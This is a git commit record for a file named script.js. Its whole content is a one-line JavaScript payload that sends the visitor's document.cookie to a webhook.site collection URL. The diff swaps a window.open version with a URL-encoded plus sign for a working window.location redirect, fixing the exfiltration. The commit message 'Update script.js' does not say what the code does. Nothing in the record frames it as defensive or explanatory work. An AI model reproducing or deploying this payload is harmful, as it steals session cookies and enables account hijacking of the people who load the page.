a816c86846d7a46c2f55ee60a8d28d50b648f1b3
Rodrigo Alves <93993233+El-Psy-Kongrooo@users.noreply.github.com>
2024-12-04 14:51:38 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-window.open("https://webhook.site/d17989b9-1585-4eeb-9e98-f5e1d827a675/?cookies"%2Bdocument.cookie)
+window.location="https://webhook.site/d17989b9-1585-4eeb-9e98-f5e1d827a675/?cookies"+document.cookie;
